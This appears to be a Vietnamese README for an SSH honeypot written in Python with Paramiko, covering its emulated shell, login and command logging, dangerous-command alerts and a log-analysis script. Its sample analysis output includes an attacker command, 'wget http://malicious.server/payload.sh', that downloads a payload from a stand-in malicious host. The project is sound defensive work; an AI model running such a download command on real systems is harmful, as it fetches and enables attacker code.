# SSH Honeypot

Dự án SSH Honeypot tương tác được viết bằng Python (sử dụng thư viện Paramiko), giúp giả lập một máy chủ SSH để thu hút, đánh lừa kẻ tấn công. Hệ thống sẽ ghi lại các nỗ lực xâm nhập (brute-force) cũng như toàn bộ câu lệnh kẻ tấn công thực thi trong môi trường shell giả lập.

## Tính năng nổi bật

- **Giả lập SSH Server**: Đóng giả một máy chủ Ubuntu (OpenSSH) và tiếp nhận mọi kết nối. Hỗ trợ xác thực bằng tài khoản/mật khẩu chỉ định (hoặc từ điển).
- **Emulated Shell (Shell Giả lập)**: Cung cấp môi trường shell ảo để kẻ tấn công tương tác sau khi đăng nhập thành công.
  - Phản hồi các câu lệnh hệ thống cơ bản (`ls`, `pwd`, `whoami`, `uname`, `ifconfig`...).
  - Môi trường tệp tin giả (fake filesystem) cho phép đọc `flag.txt`, cấu hình hệ thống...
  - Xử lý mượt các thao tác phím điều hướng (arrow keys), backspace, và lịch sử câu lệnh.
- **Ghi nhật ký chi tiết**:
  - `auth.log`: Lưu trữ thông tin đăng nhập (IP, username, password).
  - `cmd_logs.csv` / `cmd_logs.json`: Ghi lại chi tiết mọi câu lệnh kẻ tấn công đã gõ kèm theo timestamp.
  - `alerts.log`: Hệ thống cảnh báo tự động khi phát hiện các lệnh nguy hiểm (tải payload, xóa file, v.v.).
- **Công cụ phân tích (`analyze_logs.py`)**: Tự động phân tích file log để thống kê các IP thực hiện hành vi brute-force và trích xuất danh sách các lệnh cực kỳ nguy hiểm.

## Cấu trúc thư mục

- `src/`: Thư mục mã nguồn chính.
  - `honeypy.py`: Tệp khởi chạy chính của chương trình.
  - `ssh_honeypot.py`: Core xử lý server, paramiko và emulated shell.
  - `analyze_logs.py`: Script đọc và phân tích dữ liệu log.
- `key/`: Nơi lưu trữ khóa RSA (`server.key`) định danh cho SSH Server.
- `log/`: Nơi xuất và chứa các tập tin nhật ký (`auth.log`, `alerts.log`, `cmd_logs.csv`...).

## Yêu cầu và Cài đặt

1. Yêu cầu **Python 3.x**
2. Cài đặt các thư viện phụ thuộc:
```bash
pip install paramiko
```
3. Đảm bảo bạn đã có khóa RSA cho máy chủ ở `key/server.key`. Nếu chưa có, hãy tạo mới:
```bash
mkdir -p key log
ssh-keygen -t rsa -f key/server.key
```

## Hướng dẫn sử dụng

### 1. Khởi chạy Honeypot

Sử dụng tập tin `honeypy.py` trong thư mục `src`. Cần chỉ định đây là Honeypot loại SSH bằng cờ `-s` / `--ssh`, cờ `-a` (địa chỉ IP) và `-p` (cổng).

**Chạy với tài khoản/mật khẩu tự do (ai đăng nhập vào cũng bị ghi lại thất bại, hoặc bạn muốn gán cứng một account cụ thể):**
```bash
python src/honeypy.py --ssh -a 0.0.0.0 -p 2222
```

**Chạy và cho phép các tài khoản cụ thể đăng nhập thành công vào shell:**
```bash
# Định nghĩa user là 'root' mật khẩu '123456'
python src/honeypy.py --ssh -a 0.0.0.0 -p 2222 -u root -pw 123456

# Hoặc truyền vào file văn bản dạng user:password
python src/honeypy.py --ssh -a 0.0.0.0 -p 2222 --creds credentials/users.txt
```

### 2. Phân tích kết quả tấn công

Bộ script phân tích sẽ giúp nhận diện những IP nào đã cố gắng brute-force mật khẩu (5 lần thử trở lên trong 1 phút) và xem nhanh mọi hành động tải mã độc hay phá hoại.

```bash
python src/analyze_logs.py
```
Kết quả hiển thị ví dụ:
```text
[+] Brute-force Detection:
  - 192.168.1.100 made 8 login attempts around 14:05:01

[+] Dangerous Commands:
  - 2026-04-21 14:15:00 | 192.168.1.100 executed: wget http://malicious.server/payload.sh
```
